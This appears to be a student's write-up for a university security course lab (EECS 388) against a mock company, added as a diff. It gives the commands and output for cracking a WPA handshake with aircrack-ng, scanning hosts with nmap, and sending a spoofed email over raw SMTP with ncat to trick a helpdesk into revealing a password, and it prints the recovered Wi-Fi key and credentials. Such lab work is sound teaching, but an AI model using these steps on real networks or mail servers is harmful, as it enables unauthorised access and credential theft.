@@ -1,0 +1,98 @@
+3. 
+
+1. created a create_wordlist python program to generate wordlist
+2. ran aircrack-ng cap.cap -w wordlist.txt from terminal
+
+#  BSSID              ESSID                     Encryption
+
+   1  98:DE:D0:78:F3:C3  SuperDuperSketchyCorp-eecs388  WPA (1 handshake, with PMKID)
+
+      [00:00:01] 6888/46655 keys tested (4132.45 k/s) 
+
+      Time left: 9 seconds                                      14.76%
+
+                          KEY FOUND! [ EECS388-5bo ]
+
+
+      Master Key     : 9B A2 B9 DB 44 EF 35 3E E7 FE 57 F8 A8 FA EE 0B 
+                       94 AA E2 06 0B 41 DE 66 FC CB 03 D4 9F 41 A3 CF 
+
+      Transient Key  : 24 93 4F 85 F4 67 04 80 8D 80 95 F3 1B 6F 70 21 
+                       EF 3E 1F F4 AD 03 8B AA 29 59 B8 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+      EAPOL HMAC     : 6F 8E A6 9A F8 D4 A3 9A 03 6F 9A 3E 6D A0 EA 96 
+
+
+WIFI PASSWORD = EECS388-5bo
+
+
+Wi-Fi is connected to SuperDuperSketchyCorp-eecs388 and has the IP address 192.168.0.75.
+
+
+host superdupersketchycorp.com
+superdupersketchycorp.com has address 141.212.108.230
+
+PING email.superdupersketchycorp.com (141.212.108.230): 56 data bytes
+
+nmap 141.212.108.230
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-22 13:51 EDT
+Nmap scan report for superdupersketchycorp.eecs.umich.edu (141.212.108.230)
+Host is up (0.0028s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE
+25/tcp open  smtp
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 4.71 seconds
+
+NMAP ON SDSC WIFI
+
+nmap 192.168.0.0/24
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-22 14:25 EDT
+Nmap scan report for 192.168.0.1
+Host is up (0.015s latency).
+Not shown: 995 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+23/tcp    open  telnet
+80/tcp    open  http
+1900/tcp  open  upnp
+20005/tcp open  btx
+
+Nmap scan report for 192.168.0.75
+Host is up (0.00028s latency).
+Not shown: 973 closed ports, 26 filtered ports
+PORT     STATE SERVICE
+3689/tcp open  rendezvous
+
+Nmap done: 256 IP addresses (2 hosts up) scanned in 22.19 seconds
+
+
+USED NETCAT TO SPOOF EMAIL
+
+ncat -C 141.212.108.230 25
+220 sdsc Python SMTP proxy version 0.2
+HELO b
+250 sdsc
+MAIL FROM: jsschaf@email.superdupersketchycorp.com
+250 Ok
+RCPT TO: helpdesk@email.superdupersketchycorp.com
+250 Ok
+DATA
+354 End data with <CR><LF>.<CR><LF>
+From: jsschaf@email.superdupersketchycorp.com
+To: helpdesk@email.superdupersketchycorp.com                                                  
+Reply-to: jsschaf@umich.edu               
+Subject: Password
+
+Hi I forgot my password can I please have it. 
+
+221 Bye
+
+GOT AN EMAIL REPLY:
+
+ Username=jsschaf
+ Password=Bbf2gHeb
+        
